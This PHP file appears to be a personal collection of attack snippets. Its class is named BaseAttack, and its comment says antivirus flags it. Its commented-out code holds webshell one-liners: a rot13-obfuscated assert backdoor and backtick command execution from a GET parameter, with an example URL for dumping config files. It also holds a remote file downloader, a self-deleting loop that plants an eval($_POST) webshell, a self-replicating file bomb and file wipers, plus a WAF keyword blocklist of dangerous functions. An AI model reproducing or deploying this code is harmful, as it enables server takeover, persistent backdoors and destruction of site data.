<?php 
namespace Zodream\Domain\Attack;
/**
 * 攻击基类 本文件会被报毒，可以删除
 *
 * @author Jason
 * @time 2015-12-1
 */
class BaseAttack {
	
	//preg_replace("/[errorpage]/e",@str_rot13('@nffreg($_CBFG[cntr]);'),"saft");
	
	//$c=urldecode($_GET['c']);if($c){`$c`;}//完整
	//!$_GET['c']||`{$_GET['c']}`;//精简
	/*******************************************************
	 * 原理：PHP中``符号包含会当作系统命令执行
	 * 示例：http://host/?c=type%20config.php>config.txt
	 *       然后就可以下载config.txt查看内容了！
	 *       可以试试更变态的命令，不要干坏事哦！
	 *******************************************************/

	/*
	 * $str=file_get_contents($_GET[‘url’]);
        echo file_put_contents($_GET[‘file’],$str);
        //use: ?url=http://www.sswowo.com/1.txt&file=3.asp
	 */

    /**
     * DELETE SELF AND ADD SHELL
     *
	public static function addShell() {
        set_time_limit(0);

        ignore_user_abort(1);

        unlink(__FILE__);
        while(1){
            file_put_contents('path/webshell.php','<?php @eval($_POST["password"]);?>');
        }
    }

    /**
     *
     *
    public static function addBomb() {
        set_time_limit(0);
        ignore_user_abort(true);
        while(1){
            file_put_contents(randstr().'.php',file_get_content(__FILE__));
            file_get_contents("http://127.0.0.1/");
        }
    }

    public static function deleteAllFile() {
        set_time_limit(0);
        ignore_user_abort(1);
        array_map('unlink', glob("some/dir/*.php"));
    }

    public static function deleteAll() {
        set_time_limit(0);
        ignore_user_abort(1);
        unlink(__FILE__);
        while(1){
            getfiles(__DIR__);
            sleep(10);
        }
    }

    protected static function deleteFile() {
        foreach (glob($path) as $afile) {
            if (is_dir($afile)) {
                getfiles($afile.'/*.php');
            } else {
                @file_put_contents($afile,"#Anything#");
                //unlink($afile);
            }
        }
    }

    protected static function logging($var){
        file_put_contents(LOG_FILENAME, "\r\n".time()."\r\n".print_r($var, true), FILE_APPEND);
        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);
    }
    public static function waf() {
        $get = $_GET;
        $post = $_POST;
        $cookie = $_COOKIE;
        $header = getallheaders();
        $files = $_FILES;
        $ip = $_SERVER["REMOTE_ADDR"];
        $method = $_SERVER['REQUEST_METHOD'];
        $filepath = $_SERVER["SCRIPT_NAME"];
        //rewirte shell which uploaded by others, you can do more
        foreach ($_FILES as $key => $value) {
            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
            file_put_contents($_FILES[$key]['tmp_name'], "virink");
        }
        unset($header['Accept']);//fix a bug
        $input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);
        //deal with
        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";
        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
        $vpattern = explode("|",$pattern);
        $bool = false;
        foreach ($input as $k => $v) {
            foreach($vpattern as $value){
                foreach ($v as $kk => $vv) {
                    if (preg_match( "/$value/i", $vv )){
                        $bool = true;
                        logging($input);
                        break;
                    }
                }
                if($bool) break;
            }
            if($bool) break;
        }
    }*/
}